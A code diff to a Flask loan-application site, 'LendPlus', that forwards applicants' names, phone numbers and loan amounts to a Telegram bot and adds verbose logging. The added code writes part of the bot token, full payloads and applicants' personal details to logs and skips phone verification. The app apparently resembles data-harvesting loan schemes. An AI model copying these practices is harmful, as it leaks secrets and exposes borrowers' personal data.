@@ -4,6 +4,7 @@ import os
 import logging
 from datetime import datetime
 import requests
+import traceback
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
@@ -17,6 +18,12 @@ app.secret_key = os.environ.get('SECRET_KEY') or os.urandom(24)
 TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
 TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
 TELEGRAM_ENABLED = bool(TELEGRAM_TOKEN and TELEGRAM_CHAT_ID)
+
+# Log Telegram status
+if TELEGRAM_ENABLED:
+    logger.info(f"Telegram enabled: Token={TELEGRAM_TOKEN[:10]}..., Chat ID={TELEGRAM_CHAT_ID}")
+else:
+    logger.warning("Telegram is DISABLED - check environment variables")
 
 APP_NAME = "LendPlus"
 COMPANY_NAME = "Aventus Technology Limited"
@@ -33,10 +40,10 @@ LOAN_PRODUCTS = {
 # ==================== END CONFIG ====================
 
 def send_telegram_message(message):
-    """Send message to Telegram with error handling"""
+    """Send message to Telegram with detailed logging"""
     if not TELEGRAM_ENABLED:
         logger.warning("Telegram not configured - message not sent")
-        return None
+        return {"ok": False, "error": "Telegram not configured"}
     
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
@@ -45,19 +52,27 @@ def send_telegram_message(message):
             'text': message,
             'parse_mode': 'HTML'
         }
-        response = requests.post(url, json=payload, timeout=10)
+        logger.info(f"Sending to Telegram: {url}")
+        logger.info(f"Payload: {payload}")
+        
+        response = requests.post(url, json=payload, timeout=30)
+        logger.info(f"Telegram response status: {response.status_code}")
+        logger.info(f"Telegram response: {response.text}")
+        
         if response.status_code == 200:
-            logger.info("Telegram message sent successfully")
-            return response.json()
+            logger.info("✅ Telegram message sent successfully")
+            return {"ok": True, "response": response.json()}
         else:
-            logger.error(f"Telegram error: {response.status_code} - {response.text}")
-            return None
+            logger.error(f"❌ Telegram error: {response.status_code} - {response.text}")
+            return {"ok": False, "error": response.text}
+            
     except requests.exceptions.Timeout:
-        logger.error("Telegram request timed out")
-        return None
+        logger.error("❌ Telegram request timed out")
+        return {"ok": False, "error": "Timeout"}
     except Exception as e:
-        logger.error(f"Telegram error: {e}")
-        return None
+        logger.error(f"❌ Telegram error: {e}")
+        logger.error(traceback.format_exc())
+        return {"ok": False, "error": str(e)}
 
 def format_application_message(data):
     """Format application for Telegram"""
@@ -140,20 +155,20 @@ def apply():
     """Step 1: Phone number entry"""
     if request.method == 'POST':
         phone = request.form.get('phone', '').strip()
-        logger.info(f"Phone number received: {phone}")
+        logger.info(f"📱 Phone number received: {phone}")
         
         # Remove any non-numeric characters
         phone = ''.join(filter(str.isdigit, phone))
-        logger.info(f"Cleaned phone: {phone}")
+        logger.info(f"📱 Cleaned phone: {phone}")
         
         if phone and len(phone) >= 7:
             session['phone'] = phone
-            logger.info(f"Phone saved to session: {session['phone']}")
-            # Skip OTP and go directly to personal info
             session['verified'] = True
+            logger.info(f"✅ Phone saved to session: {session['phone']}")
             return redirect(url_for('personal_info'))
         else:
             error = "Please enter a valid phone number (at least 7 digits)"
+            logger.warning(f"❌ Invalid phone: {phone}")
             return render_template('apply.html', error=error)
     
     return render_template('apply.html')
@@ -181,7 +196,7 @@ def personal_info():
         session['gender'] = request.form.get('gender')
         session['alt_phone'] = request.form.get('alt_phone', '').strip()
         
-        logger.info(f"Personal info saved for {session['first_name']}")
+        logger.info(f"✅ Personal info saved for {session['first_name']} {session['last_name']}")
         return redirect(url_for('loan_amount'))
     
     return render_template('personal_info.html')
@@ -195,8 +210,11 @@ def loan_amount():
     if request.method == 'POST':
         try:
             amount = float(request.form.get('loan_amount', 0))
+            logger.info(f"💰 Loan amount received: {amount}")
+            
             if amount < MIN_LOAN or amount > MAX_LOAN:
                 error = f"Loan amount must be between KES {MIN_LOAN:,.0f} and KES {MAX_LOAN:,.0f}"
+                logger.warning(f"❌ Invalid amount: {amount}")
                 return render_template('loan_amount.html', error=error)
             
             details = calculate_loan_details(amount)
@@ -218,31 +236,59 @@ def loan_amount():
                 'application_id': application_id
             }
             
-            # Send to Telegram (with error handling - won't break the app)
-            try:
-                if TELEGRAM_ENABLED:
+            logger.info("=" * 50)
+            logger.info("📋 APPLICATION RECEIVED")
+            logger.info(f"Name: {application_data['first_name']} {application_data['last_name']}")
+            logger.info(f"Phone: {application_data['phone']}")
+            logger.info(f"Amount: {application_data['loan_amount']}")
+            logger.info(f"Application ID: {application_id}")
+            logger.info("=" * 50)
+            
+            # Send to Telegram
+            telegram_result = {"ok": False}
+            if TELEGRAM_ENABLED:
+                try:
+                    logger.info("📤 Attempting to send to Telegram...")
                     message = format_application_message(application_data)
-                    send_telegram_message(message)
-                    send_telegram_message(
+                    
+                    # Send the full application
+                    result1 = send_telegram_message(message)
+                    logger.info(f"Full message result: {result1}")
+                    
+                    # Send a quick notification
+                    result2 = send_telegram_message(
                         f"🔔 New application from {application_data['first_name']} "
                         f"{application_data['last_name']} for KES {amount:,.2f}"
                     )
-                    logger.info(f"Application {application_id} sent to Telegram")
-                else:
-                    logger.warning("Telegram not configured - skipping notification")
-            except Exception as e:
-                logger.error(f"Telegram notification failed but application continues: {e}")
+                    logger.info(f"Quick notification result: {result2}")
+                    
+                    if result1 and result1.get('ok'):
+                        telegram_result = {"ok": True}
+                        logger.info("✅ Application sent to Telegram successfully!")
+                    else:
+                        logger.error("❌ Failed to send to Telegram")
+                except Exception as e:
+                    logger.error(f"❌ Telegram error: {e}")
+                    logger.error(traceback.format_exc())
+                    telegram_result = {"ok": False, "error": str(e)}
+            else:
+                logger.warning("⚠️ Telegram is disabled - no notification sent")
+                telegram_result = {"ok": False, "error": "Telegram not configured"}
             
             # Store in session
             session['application_data'] = application_data
+            session['telegram_sent'] = telegram_result.get('ok', False)
+            
+            logger.info("✅ Application data saved to session, redirecting to confirmation")
             return redirect(url_for('confirmation'))
             
         except ValueError as e:
-            logger.error(f"ValueError: {e}")
+            logger.error(f"❌ ValueError: {e}")
             error = "Please enter a valid amount"
             return render_template('loan_amount.html', error=error)
         except Exception as e:
-            logger.error(f"Unexpected error: {e}")
+            logger.error(f"❌ Unexpected error: {e}")
+            logger.error(traceback.format_exc())
             error = "An unexpected error occurred. Please try again."
             return render_template('loan_amount.html', error=error)
     
@@ -260,9 +306,8 @@ def confirmation():
     if not data:
         return redirect(url_for('loan_amount'))
     
-    # Clear session data after showing confirmation
-    # (optional - comment out if you want to keep data)
-    # session.clear()
+    telegram_sent = session.get('telegram_sent', False)
+    logger.info(f"📋 Showing confirmation - Telegram sent: {telegram_sent}")
     
     return render_template('confirmation.html',
                          first_name=data.get('first_name', ''),
@@ -272,7 +317,8 @@ def confirmation():
                          total=data.get('total', 0),
                          months=data.get('months', 0),
                          application_id=data.get('application_id', ''),
-                         support_phone=SUPPORT_PHONE)
+                         support_phone=SUPPORT_PHONE,
+                         telegram_sent=telegram_sent)
 
 @app.route('/dashboard')
 def dashboard():
@@ -319,7 +365,7 @@ def page_not_found(e):
 
 @app.errorhandler(500)
 def internal_server_error(e):
-    logger.error(f"500 Error: {e}")
+    logger.error(f"❌ 500 Error: {e}")
     return render_template('index.html', error="Something went wrong. Please try again."), 500
 
 if __name__ == '__main__':
